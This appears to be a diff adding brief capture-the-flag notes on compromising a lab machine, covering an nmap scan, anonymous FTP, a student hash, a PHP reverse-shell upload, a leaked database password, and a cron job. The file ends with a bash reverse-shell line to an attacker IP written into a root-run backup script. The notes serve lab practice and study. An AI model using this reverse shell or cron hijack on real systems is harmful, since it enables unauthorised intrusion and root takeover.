@@ -1,0 +1,41 @@
+**NMAP Scan**
+21/tcp open  ftp     vsftpd 3.0.3
+Anonymous FTP login allowed
+-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
+
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+Apache2 Debian Default Page: It works
+
+** Note.txt **
+INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
+('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');
+
+The StudentRegno number is what you use for login.
+cd73502828457d15655bbd7a63fb0bc8:student
+10201321:student
+
+**Directory Bruiteforcing**
+/academy
+
+**File upload**
+shell.php - Got rev shell
+
+**PHP Config File**
+grimmie:My_V3ryS3cur3_P4ss
+
+**Cron Tab**
+
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+* * * * * /home/grimmie/backup.sh
+
+**Backup.sh**
+/bin/sh -i >& /dev/tcp/192.168.43.164/9999 0>&1
+
